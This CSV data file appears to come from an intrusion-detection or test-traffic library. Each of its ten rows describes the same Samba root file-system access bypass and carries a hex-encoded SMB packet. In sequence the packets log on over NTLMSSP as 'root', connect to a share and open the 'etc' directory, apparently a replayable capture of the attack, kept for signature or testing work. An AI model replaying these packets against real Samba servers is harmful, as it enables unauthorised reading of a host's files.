XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 A2 FF ||SMBs||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A 00 00 02 00 0C FF 00 00 00 FF FF 02 00 01 00 00 00 00 00 ||P||00 00 00 00 00 ||\||00 00 80 ||g||00 ||`N||06 06 ||+||06 01 05 05 02 A0 ||D0B||A0 0E ||0||0C 06 0A ||+||06 01 04 01 82 ||7||02 02 0A A2 ||0||04 ||.NTLMSSP||00 01 00 00 00 15 02 08 ||`||07 00 07 00 || ||00 00 00 07 00 07 00 ||'||00 00 00 ||MYGROUPDHCP215||00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 01 02 FF ||SMBs||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A ||d||00 03 00 0C FF 00 00 00 FF FF 02 00 01 00 00 00 00 00 B0 00 00 00 00 00 ||\||00 00 80 C7 00 A1 81 AD ||0||81 AA A2 81 A7 04 81 A4 ||NTLMSSP||00 03 00 00 00 18 00 18 00 ||@||00 00 00 18 00 18 00 ||X||00 00 00 0E 00 0E 00 ||p||00 00 00 08 00 08 00 ||~||00 00 00 0E 00 0E 00 86 00 00 00 10 00 10 00 94 00 00 00 15 02 08 ||`||D2 A8 92 ||[<||EA 14 ||E||00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ||{||B3 A3 08 ||r||85 ||_||B4 EE 1C A2 88 ||L||DD ||'||9E BC F3 1F 16 99 3B ||]eM||00 ||Y||00 ||G||00 ||R||00 ||O||00 ||U||00 ||P||00 ||r||00 ||o||00 ||o||00 ||t||00 ||D||00 ||H||00 ||C||00 ||P||00 ||2||00 ||1||00 ||5||00 ||xHG||B0 ||e(||0B 22 AC AC E5 ||#||EF ||.||F0 ||+||00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||X||FF ||SMBs||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A ||d||00 04 00 0D FF 00 00 00 FF FF 02 00 3A 0A 0D ||N||00 00 00 00 00 00 00 00 00 00 ||\||00 00 00 1B 00 00 00 00 00 00 ||U||00 ||n||00 ||i||00 ||x||00 00 00 ||S||00 ||a||00 ||m||00 ||b||00 ||a||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||F||FF ||SMBu||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A ||e||00 05 00 04 FF 00 00 00 00 00 01 00 1B 00 00 ||\||00 ||\||00 ||D||00 ||H||00 ||C||00 ||P||00 ||4||00 ||4||00 ||\||00 00 00 ||?????||00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||(||FF ||SMB||10 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 06 00 00 05 00 04 ||\||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||(||FF ||SMB||10 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 07 00 00 05 00 04 ||\||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||X||FF ||SMB2||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 08 00 0F 14 00 00 00 0A 00 04 ||A||00 00 00 00 00 00 00 00 00 00 14 00 ||D||00 00 00 ||X||00 01 00 01 00 17 00 00 ||D ||16 00 00 02 06 00 04 01 00 00 00 00 ||e||00 ||t||00 ||c||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||#||FF ||SMB||80 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 09 00 00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||(||FF ||SMB||10 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0A 00 00 05 00 04 ||\||00 00 00||
FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 ||.||FF ||SMB||10 00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 01 00 3A 0A ||e||00 0B 00 00 0B 00 04 ||\||00 ||e||00 ||t||00 ||c||00 00 00||
